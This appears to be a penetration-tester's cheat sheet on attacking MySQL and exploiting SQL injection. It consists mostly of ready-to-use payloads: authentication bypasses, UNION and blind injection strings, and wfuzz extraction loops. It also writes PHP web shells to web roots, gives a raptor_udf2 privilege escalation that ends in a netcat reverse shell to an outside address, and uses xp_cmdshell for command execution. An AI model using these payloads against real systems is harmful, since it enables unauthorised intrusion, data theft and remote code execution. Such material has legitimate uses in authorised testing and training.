## MySQL Port 3306

#### Enumeration

````
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.11.1.8 
````

#### Logging in

```bash
mysql -u root -p
mysql -u root -p'root' -h $ip -P 3306
mysql -u 'lavita' -p 'lavita' #  lavita db
```
#### If youre getting a bunch of weird errors, try using mycli

#### Reading LOAD_FILE CONTENTS

```sql
SELECT CONVERT(UNHEX(HEX(LOAD_FILE('/var/www/html/config.php'))) USING utf8);

SELECT User,Password FROM mysql.user UNION SELECT 1,"<?php system($_GET['cmd
                                      -> ']);?>" INTO OUTFILE "/var/www/html/img/index2.php";
```

#### Commands

```sql	
mysql -u root -h docker.hackthebox.eu -P 3306 -p #	login to mysql database
SHOW DATABASES #	List available databases
USE users #	Switch to database
CREATE TABLE logins (id INT, ...) #	Add a new table
SHOW TABLES #	List available tables in current database
DESCRIBE logins #	Show table properties and columns
INSERT INTO table_name VALUES (value_1,..) #	Add values to table
INSERT INTO table_name(column2, ...) VALUES (column2_value, ..) #	Add values to specific columns in a table
UPDATE table_name SET column1=newvalue1, ... WHERE <condition> #	Update table values
SELECT * FROM table_name #	Show all columns in a table
SELECT column1, column2 FROM table_name #	Show specific columns in a table
DROP TABLE logins #	Delete a table
ALTER TABLE logins ADD newColumn INT #	Add new column
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn #	Rename column
ALTER TABLE logins MODIFY oldColumn DATE #	Change column datatype
ALTER TABLE logins DROP oldColumn #	Delete column
SELECT * FROM logins ORDER BY column_1 #	Sort by column
SELECT * FROM logins ORDER BY column_1 DESC #	Sort by column in descending order
SELECT * FROM logins ORDER BY column_1 DESC, id ASC #	Sort by two-columns
SELECT * FROM logins LIMIT 2 #	Only show first two results
SELECT * FROM logins LIMIT 1, 2 #	Only show first two results starting from index 2
SELECT * FROM table_name WHERE <condition> #	List results that meet a condition
SELECT * FROM logins WHERE username LIKE 'admin%' #	List results where the name is similar to a given string
```

```sql	
# Auth Bypass
admin' or '1'='1 #	Basic Auth Bypass
admin')-- - #	Basic Auth Bypass With comments	
# Union Injection 	
' order by 1-- - #	Detect number of columns using order by
cn' UNION select 1,2,3-- - #	Detect number of columns using Union injection
cn' UNION select 1,@@version,3,4-- - #	Basic Union injection
UNION select username, 2, 3, 4 from passwords-- - #	Union injection for 4 columns
# DB Enumeration 	
SELECT @@version #	Fingerprint MySQL with query output
SELECT SLEEP(5) #	Fingerprint MySQL with no output
cn' UNION select 1,database(),2,3-- - #	Current database name
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - #	List all databases
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - #	List all tables in a specific database
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - #	List all columns in a specific table
cn' UNION select 1, username, password, 4 from dev.credentials-- - #	Dump data from a table in another database
# Privileges 	
cn' UNION SELECT 1, user(), 3, 4-- - #	Find current user
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- - #	Find if user has admin privileges
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- - #	Find if all user privileges
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- - #	Find which directories can be accessed through MySQL
# File Injection 	
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - #	Read local file
select 'file written successfully!' into outfile '/var/www/html/proof.txt' #	Write a string to a local file
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- - #	Write a web shell into the base web directory
```

#### Login

Try logging in as someone you know is a valid user, and with "%" as the password.

```php
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

#### MySQL 4.x or MySQL 5.x ?? -> root :)

```bash
gcc -g -c raptor_udf2.c  #compile the exploit code
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc #create the shared library (so)
mysql -u root -p
show variables like '%plugin%';
show variables like '%secure_file_priv%'; # Empty = good
use mysql;
create table foo(line blob);
insert into foo values(load_file('/var/www/raptor_udf2.so')); # Or wherever you want
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('id > /var/www/output; chown www-data www-data  /var/www/output'); # Get creative
select do_system('nc 192.168.49.136 8080 -e /bin/bash');
```

```bash
> admin' or 1=1-- -
```

#### Modifying Exploit

We found the webroot to be /var/www/html/. Note that I changed the query from the url to a header in a request, so at the end of the request, I put view=... I also changed it from a GET to a POST with "Content-Type: application/x-www-form-urlencoded".

From:
```bash
http://website.com/zm/?view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#&minTime=5
```
To:
```bash
http://website.com/zm/?view=request&request=log&task=query&limit=100;SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php”

#or for windows
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

Upload php command injection.

```bash
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

Load file.

```bash
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```

Inside URL:

```bash
http://192.168.11.35/comment.php?id=738 order by 1
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,5,6
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,@@version,6
# To!discover!the!current!user!being!used!for!the!database!connection:
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,user(),6
# View the tables
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
# Look into users table
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
# Extract username and password
http://192.168.11.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
```

#### Enumeration

```bash
SELECT * FROM mysql.user;
```

## SQL Injection - MySQL/MariaDB

Bypass Authentication
```
' or 1=1 -- -
admin' -- -
' or 1=1 order by 2 -- -
' or 1=1 order by 1 desc -- - 
' or 1=1 limit 1,1 -- -
```

get number columns
```
-1 order by 3;#
```

get version
```
-1 union select 1,2,version();#
```

get database name
```
-1 union select 1,2,database();#
```

get table name
```
-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<database_name>";#
```

get column name
``` 
-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<database_name>" and table_name="<table_name>";#
```

dump
```
-1 union select 1,2, group_concat(<column_names>) from <database_name>.<table_name>;#
```

#### Webshell via SQLI

view web server path  
```
LOAD_FILE('/etc/httpd/conf/httpd.conf')    
```

creating webshell
```
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
```
 
#### Reading Files via SQLI - MySQL

```
SELECT LOAD_FILE('/etc/passwd')
```


#### Notes

- If you have a valid password, try using that same password for the admin accounts (root)
- mycli solved ssl problem

#### SQLite

```bash
http://site.com/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- # Extract Table Names
http://site.com/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users-- # Extract Table Users
```

#### Oracle SQL

```bash
' or 1=1-- # Auth bypass
' order by 3-- # Get number of columns
' union select null,table_name,null from all_tables-- # Get table name
' union select null,column_name,null from all_tab_columns where table_name='<table_name>'-- # Get column name
' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS-- # Dump data
```

#### Start up MYSQL Locally

```bash
sudo systemctl start mysql
sudo mysql -u root -p
```

#### Use .sql file

```bash
sudo mysql -u root -p > setup.sql
```

This worked instead for me.

```bash
sudo mysql -u root -p
create database test
use database test
source /path/to/setup.sql
```


#### SQL Injection Cheatsheet
This cheatsheet should NOT be conbsiderd as reference but guide to built on, some of the examples below will require modification(s) such as url encode, comments, etc. Before we contiune here is couple good to know SQL functions

```php
limit <row offset>,<number of rows>                          # display rows based on offset and number  

count(*)                                                     # display number of rows  

rand()                                                       # generate random number between 0 and 1 

floor(rand()*<number>)                                       # print out number part of random decimal number 

select(select database());                                   # double query (nested) using database() as an example 

group by <column name>                                       # summerize rows based on column name  

concat(<string1>, <string2>, ..)                             # concatenate strings such as tables, column names  

length(<string>)                                             # calculate the number of characters for given string 

substr(<string>,<offset>,<characters length>)                # print string character(s) by providing offset and length 

ascii(<character>)                                           # decimal representation of the character 

sleep(<number of seconds>)                                   # go to sleep for <number of seconds>

if(<condition>,<true action>,<false action>)                 # conditional if statement 

like "<string>%"                                             # checks if provided string present

outfile "<url to file>"                                      # dump output of select statement into a file

load_file("<url to file>")                                   # dump the content of file
```
Now comes the fun part, here's combination of error, union, blind SQL command injection examples.

Determine back-end query number of columns with error-based string SQL command injection
```php
http://meh.com/index.php?id=1 order by <number>
```

Determine back-end query number of columns by observing `http response size` with `wfuzz` in error-based integer SQL command injection
```php
wfuzz -c -z range,1-10 "http://meh.com/index.php?id=1 order by FUZZ"
```

Identify webpage printable union columns by providing false value to back-end query with error-based integer SQL command injection. This injection depends on number of columns identified by `order by` clause
```php
http://meh.com/index.php?id=-1 union select <number of columns seperated by comma>
```

Dump the content of table into the filesystem
```php
http://meh.com/index.php?id=-1')) union select <column1>,<column2> from <table name> into outfile "<url to file>" --+
```

Print back-end SQL version with error-based integer SQL command injection, assuming column 3 content gets diplayed on webpage
```php
http://meh.com/index.php?id=-1 union select 1,2,@@version,4,...
```

Print user running the query to access back-end database server with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,user(),4,...
```

Print database name with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,database(),4,...
```

Print database directory with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,@@datadir,4,...
```

Print table names with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,group_concat(table_name),4,... from information_schema.tables where table_schema=database()
```

Print column names with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,group_concat(column_name),4,... from information_schema.columns where table_name='<table name>'
```

Print content of column with error-based integer SQL command injection 
```php
http://meh.com/index.php?id=-1 union select 1,2,group_concat(<column name>),4,... from <table name>
```

Use `and` statement as substitute to reqular comments such as `--+`, `#`, and `/* */` with error-based string SQL command injection
```php
http://meh.com/index.php?id=1' <sqli here> and '1
```
Determine databsae name with boolean-based blind SQL injection with `substr()`
```php
http://meh.com/index.php?id=1' and (substr(database(),<offset>,<character length>))='<character>' --+
```

Determine databsae name with boolean-based blind SQL injection by observing `http response size` with combination of `substr()` and `wfuzz`, assuming database name does not include special characters
```php
for i in $(seq 1 10); do wfuzz -c -z list,a-b-c-d-e-f-g-h-i-j-k-l-m-n-o-p-q-r-s-t-u-v-w-x-y-z --hw=<word count> "http://meh.com/index.php?id=1' and (substr(database(),$i,1))='FUZZ' --+";done 
```
Determine databsae name with boolean-based blind SQL injection by observing `http response size` with `substr()`, `ascii()` and `wfuzz`. The below range is the standard ASCII characters (32-127) 
```php
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr(database(),$i,1)))=FUZZ --+";done 
```

Determine table name with boolean-based blind SQL injection by observing `http response size` with `substr()`, `ascii()`, and `wfuzz`.The below range is the standard ASCII characters (32-127) 
```php
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ --+";done # increment limit first argument by 1 to get the next available table name 
```

Determine column name with boolean blind-based SQL injection by observing `http response size` with `substr()`, `ascii()`, and `wfuzz`. The below range is the standard ASCII characters (32-127) 
```php
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name=<table name> limit 0,1),$i,1)))=FUZZ --+";done # increment limit first argument by 1 to get the next available column name 
```
Boolean-based blind SQL command injection demo

![alt text](https://j.gifs.com/W77p8o.gif)

Confirm time-based blind SQL injection using `sleep()` function
```php
http://meh.com/index.php?id=1' and sleep(10) --+
```

Determine database version with time-based blind SQL injection using `sleep()`, `like""`, and conditional `if`, assuming the back-end database is running version 5
```php
http://meh.com/index.php?id=1' and if((select version()) like "5%", sleep(10), null) --+
```

Determine database name with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
```php
for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://meh.com/index.php?id=1' and if((ascii(substr(database(),$i,1)))=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt>
```

Determine table name with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, `if`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
```php
for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://meh.com/index.php?id=1' and if((select ascii(substr(table_name,$i,1))from information_schema.tables where table_schema=database() limit 0,1)=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # increment limit first argument by 1 to get the next available table name 
```
Determine column name with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, `if`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
```php
for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://meh.com/index.php?id=1' and if((select ascii(substr(column_name,$i,1))from information_schema.columns where table_name='<table name>' limit 0,1)=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # increment limit first argument by 1 to get the next available column name 
```

Extract column content with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, `if`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
```php
for i in $(seq 1 10); do wfuzz -v -c -z range,0-10 -z range,32-127 "http://meh.com/index.php?id=1' and if(ascii(substr((select <column name> from <table name> limit FUZZ,1),$i,1))=FUZ2Z, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # change <column name> to get the content of next column
```
Time-based blind SQL command injection with bash magic demo

![alt text](https://j.gifs.com/2vv2J1.gif)

Hope those were helpfull! Now here's couple login bypass commands that worked for me
```php
meh' OR 3=3;#
meh' OR 2=2 LIMIT 1;#
meh' OR 'a'='a
meh' OR 1=1 --+
```
Sometimes you'll run into Microsoft SQL server that have `xp_cmdshell` turned on, here's syntax for remote code execution
```php
meh' exec master..xp_cmdshell '<command here>' --
```

- Use your proxy of choice to bypass client-side javascript restrictions
- `order by` clause works only with regular comments such as `--+`
- Update ASCII range to include special characters if you're going after users table
- `MySQL` don't have permissions to overwrite an exsisting file, make sure you go with new filename every single time with `outfile`.
- Make sure the vulnerable paramater have false value when working with union-based SQL command injection
- It's worth noting that all of the examples in this cheatsheet where http `GET` requests, and it shouldn't be that hard to replicate them with http `POST`requests once you grasp the core concepts.
- You need to input true value to the vulnerable paramter for `and sleep()` to work, otherwise go with `or sleep()`. Here's an example for the sake of clarification
```php
http://meh.com/index.php?id=<true value>' and sleep(1) #
http://meh.com/index.php?id=<false value>' or sleep(1) #
```